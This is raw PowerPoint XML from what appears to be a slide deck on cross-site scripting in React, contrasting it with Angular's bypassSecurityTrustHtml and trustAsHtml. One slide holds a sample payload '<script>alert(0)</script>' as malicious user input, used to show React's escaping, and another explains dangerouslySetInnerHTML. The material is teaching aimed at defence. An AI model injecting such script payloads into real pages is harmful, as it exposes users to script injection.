                        <a:rPr lang="en-US" sz="1900" b="0" i="0" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="000000"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>script</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1900" b="0" i="0" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="777777"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>&gt;</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1900" b="0" i="0" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="000000"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>alert</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1900" b="0" i="0" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="777777"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>(</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1900" b="0" i="0" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="CF6745"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>0</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1900" b="0" i="0" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="777777"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>)&lt;/</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1900" b="0" i="0" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="000000"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>script</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1900" b="0" i="0" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="777777"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>&gt;</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1900" b="0" i="0" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>'</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1900" b="0" i="0" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="777777"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>;</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1900" dirty="0"/>
                    </a:p>
                    <a:p>
                      <a:pPr marL="0" marR="0" indent="0" algn="l" defTabSz="457200" rtl="0" eaLnBrk="1" fontAlgn="auto" latinLnBrk="0" hangingPunct="1">
                        <a:lnSpc>
                          <a:spcPct val="100000"/>
                        </a:lnSpc>
                        <a:spcBef>
                          <a:spcPts val="0"/>
                        </a:spcBef>
                        <a:spcAft>
                          <a:spcPts val="0"/>
                        </a:spcAft>
                        <a:buClrTx/>
                        <a:buSzTx/>
                        <a:buFontTx/>
                        <a:buNone/>
                        <a:tabLst/>
                        <a:defRPr/>
                      </a:pPr>
                      <a:br>
                        <a:rPr lang="en-US" sz="1900" dirty="0"/>
                      </a:br>
                      <a:r>
                        <a:rPr lang="en-US" sz="1900" b="0" i="0" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="000000"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>render</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1900" b="0" i="0" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="777777"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>()</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1900" b="0" i="0" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="000000"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t> </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1900" b="0" i="0" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="777777"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>{</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1900" b="0" i="0" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="000000"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t> </a:t>
                      </a:r>
                      <a:br>
                        <a:rPr lang="en-US" sz="1900" dirty="0"/>
                      </a:br>
                      <a:r>
                        <a:rPr lang="en-US" sz="1900" b="0" i="0" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="000000"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>  </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1900" b="0" i="0" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="0000FF"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>return</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1900" b="0" i="0" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="000000"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t> </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1900" b="0" i="0" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="777777"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>(</a:t>
                      </a:r>
                      <a:br>
                        <a:rPr lang="en-US" sz="1900" dirty="0"/>
                      </a:br>
                      <a:r>
                        <a:rPr lang="en-US" sz="1900" b="0" i="0" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="000000"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>    </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1900" b="0" i="0" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="777777"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>&lt;</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1900" b="0" i="0" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="000000"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>div</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1900" b="0" i="0" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="777777"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>&gt;{</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1900" b="0" i="0" dirty="0" err="1">
                          <a:solidFill>
                            <a:srgbClr val="000000"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>maliciousUserInput</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1900" b="0" i="0" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="777777"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>}&lt;/</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1900" b="0" i="0" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="000000"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>div</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1900" b="0" i="0" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="777777"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>&gt;</a:t>
                      </a:r>
                    </a:p>
                    <a:p>
                      <a:pPr marL="0" marR="0" indent="0" algn="l" defTabSz="457200" rtl="0" eaLnBrk="1" fontAlgn="auto" latinLnBrk="0" hangingPunct="1">
                        <a:lnSpc>
                          <a:spcPct val="100000"/>
                        </a:lnSpc>
                        <a:spcBef>
                          <a:spcPts val="0"/>
                        </a:spcBef>
                        <a:spcAft>
                          <a:spcPts val="0"/>
                        </a:spcAft>
                        <a:buClrTx/>
                        <a:buSzTx/>
                        <a:buFontTx/>
                        <a:buNone/>
                        <a:tabLst/>
                        <a:defRPr/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1900" b="0" i="1" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="777777"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>    //renders &lt;div&gt;&amp;</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1900" b="0" i="1" dirty="0" err="1">
                          <a:solidFill>
                            <a:srgbClr val="777777"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>lt;script&amp;alert</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1900" b="0" i="1" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="777777"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>(0)&amp;</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1900" b="0" i="1" dirty="0" err="1">
                          <a:solidFill>
                            <a:srgbClr val="777777"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>lt</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1900" b="0" i="1" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="777777"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>;/</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1900" b="0" i="1" dirty="0" err="1">
                          <a:solidFill>
                            <a:srgbClr val="777777"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>script&amp;gt</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1900" b="0" i="1" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="777777"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>;&lt;/div&gt;</a:t>
                      </a:r>
                      <a:br>
                        <a:rPr lang="en-US" sz="1900" dirty="0"/>
                      </a:br>
                      <a:r>
                        <a:rPr lang="en-US" sz="1900" b="0" i="0" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="000000"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>  </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1900" b="0" i="0" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="777777"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>)</a:t>
                      </a:r>
                      <a:br>
                        <a:rPr lang="en-US" sz="1900" dirty="0"/>
                      </a:br>
                      <a:r>
                        <a:rPr lang="en-US" sz="1900" b="0" i="0" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="777777"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>}</a:t>
                      </a:r>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0000"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
            </a:tbl>
          </a:graphicData>
        </a:graphic>
      </p:graphicFrame>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Content Placeholder 2"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="758455" y="4364311"/>
            <a:ext cx="10972800" cy="1823838"/>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Does not modify </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>InnerHTML</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>, but if you really have to…</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>Use </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>dangerouslySetInnerHTML</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>Pass an object with an __html key</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="292608" lvl="1" indent="0">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Rectangle 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6096000" y="5464028"/>
            <a:ext cx="5648085" cy="584775"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0"/>
              <a:t>“</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0" err="1"/>
              <a:t>bypassSecurityTrustHtml</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0"/>
              <a:t>”   &gt;   “</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0" err="1"/>
              <a:t>dangerouslySetInnerHTML</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0"/>
              <a:t>”</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0"/>
              <a:t>“</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0" err="1"/>
              <a:t>trustAsHtml</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0"/>
              <a:t>”</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7322" y="4789544"/>
            <a:ext cx="631954" cy="631954"/>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2522" y="4674515"/>
            <a:ext cx="1219200" cy="862013"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="679260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Expression Injection vs Component Injection</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="609600" y="1414464"/>
            <a:ext cx="10972800" cy="2073015"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2600" dirty="0"/>
              <a:t>React does not have an expression language </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>No Expression Injection</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2600" dirty="0"/>
              <a:t>React has components</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>Component Injection for dynamically created components</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:graphicFrame>
        <p:nvGraphicFramePr>
          <p:cNvPr id="4" name="Table 3"/>
          <p:cNvGraphicFramePr>
            <a:graphicFrameLocks noGrp="1"/>
          </p:cNvGraphicFramePr>
          <p:nvPr>
            <p:extLst>
              <p:ext uri="{D42A27DB-BD31-4B8C-83A1-F6EECF244321}">
                <p14:modId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3941610040"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="609600" y="3690369"/>
          <a:ext cx="3983665" cy="1907824"/>
        </p:xfrm>
        <a:graphic>
          <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/table">
            <a:tbl>
              <a:tblPr/>
              <a:tblGrid>
                <a:gridCol w="3983665">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="556568719"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
              </a:tblGrid>
              <a:tr h="1422430">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="2000" b="0" i="1" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="777777"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>// JSX</a:t>
                      </a:r>
                      <a:br>
                        <a:rPr lang="en-US" sz="2000" b="0" dirty="0">
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                      </a:br>
                      <a:r>
                        <a:rPr lang="en-US" sz="2000" b="0" dirty="0" err="1">
                          <a:solidFill>
                            <a:srgbClr val="0000FF"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>const</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="2000" b="0" dirty="0">
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t> element </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a:t>
                      </a:r>
                      <a:br>
                        <a:rPr lang="en-US" sz="2000" b="0" dirty="0">
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                      </a:b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&lt;</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="2000" b="0" dirty="0">
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>h1 </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="2000" b="0" dirty="0" err="1">
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>className</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="2000" b="0" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="777777"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>=</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="2000" b="0" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>"</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="2000" b="0" dirty="0">
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>greeting"</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="2000" b="0" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="777777"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>&gt;</a:t>
                      </a:r>
                      <a:br>
                        <a:rPr lang="en-US" sz="2000" b="0" dirty="0">
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                      </a:br>
                      <a:r>
                        <a:rPr lang="en-US" sz="2000" b="0" dirty="0">
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>  Hello</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world</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="2000" b="0" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="777777"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>!</a:t>
                      </a:r>
                      <a:br>
                        <a:rPr lang="en-US" sz="2000" b="0" dirty="0">
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                      </a:b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&lt;/</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="2000" b="0" dirty="0">
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>h1</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="2000" b="0" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="777777"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>&gt;</a:t>
                      </a:r>
                      <a:br>
                        <a:rPr lang="en-US" sz="2000" b="0" dirty="0">
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                      </a:br>
                      <a:r>
                        <a:rPr lang="en-US" sz="2000" b="0" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="777777"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>);</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="20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8606267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47304327"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="5185144" y="3690369"/>
          <a:ext cx="6319284" cy="1907824"/>
        </p:xfrm>
        <a:graphic>
          <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/table">
            <a:tbl>
              <a:tblPr/>
              <a:tblGrid>
                <a:gridCol w="6319284">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="556568719"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
              </a:tblGrid>
              <a:tr h="1422430">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="2000" b="0" i="1" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="777777"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>// </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="2000" b="0" i="1" dirty="0" err="1">
                          <a:solidFill>
                            <a:srgbClr val="777777"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>Transpiled</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="2000" b="0" i="1" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="777777"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t> to JavaScript </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="2000" b="0" dirty="0" err="1">
                          <a:solidFill>
                            <a:srgbClr val="0000FF"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>const</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="2000" b="0" dirty="0">
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t> element </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a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="2000" b="0" dirty="0" err="1">
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>React</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="2000" b="0" dirty="0" err="1">
                          <a:solidFill>
                            <a:srgbClr val="777777"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>.</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="2000" b="0" dirty="0" err="1">
                          <a:solidFill>
                            <a:srgbClr val="0000FF"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
